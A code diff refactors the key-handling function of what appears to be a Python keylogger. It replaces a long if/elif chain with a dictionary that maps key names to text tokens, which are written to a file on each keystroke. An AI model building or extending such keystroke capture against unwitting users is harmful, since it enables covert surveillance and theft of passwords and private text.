@@ -39,57 +39,38 @@ def wfile(data):
     f.write(data)
     f.close()
 
+SYMBOLS = {
+    'space': ' ',
+    'return': '\n',
+    'lshift': ' LSHIFT ',
+    'rshift': ' RSHIFT ',
+    'tab': ' TAB ',
+    'capital': ' CAPITAL ',
+    'escape': ' ESCAPE ',
+    'delete': ' DELETE ',
+    'back': ' BACK ',
+    'lcontrol': ' LCTRL ',
+    'lmenu': ' LALT ',
+    'oem_102': '\\ ',
+    'oem_comma': ', ',
+    'oem_period': '. ',
+    'oem_2': '/ ',
+    'oem_1': '; ',
+    'oem_7': '\' ',
+    'oem_5': '\\ ',
+    'oem_4': '[ ',
+    'oem_6': ' ] ',
+    'oem_minus': ' - ',
+    'oem_plus': ' = ',
+    'oem_3': ' \` ',
+    }
 
 def key(event):
     data = str(event.Key)
     data = data.lower()
 
-    if data == 'space':
-        data = ' '
-    elif data == 'return':
-        data = '\n'
-    elif data == 'lshift':
-        data = ' LSHIFT '
-    elif data == 'rshift':
-        data = ' RSHIFT '
-    elif data == 'tab':
-        data = ' TAB '
-    elif data == 'capital':
-        data = ' CAPITAL '
-    elif data == 'escape':
-        data = ' ESCAPE '
-    elif data == 'delete':
-        data = ' DELETE '
-    elif data == 'back':
-        data = ' BACK '
-    elif data == 'lcontrol':
-        data = ' LCTRL '
-    elif data == 'lmenu':
-        data = ' LALT '
-    elif data == 'oem_102':
-        data = '\\ '
-    elif data == 'oem_comma':
-        data = ', '
-    elif data == 'oem_period':
-        data = '. '
-    elif data == 'oem_2':
-        data = '/ '
-    elif data == 'oem_1':
-        data = '; '
-    elif data == 'oem_7':
-        data = '\' '
-    elif data == 'oem_5':
-        data = '\\ '
-    elif data == 'oem_4':
-        data = '[ '
-    elif data == 'oem_6':
-        data = ' ] '
-    elif data == 'oem_minus':
-        data = ' - '
-    elif data == 'oem_plus':
-        data = ' = '
-    elif data == 'oem_3':
-        data = ' \` '
+    if data in dict(SYMBOLS):
+        data = SYMBOLS[data]
 
     wfile(data)
     data = ''
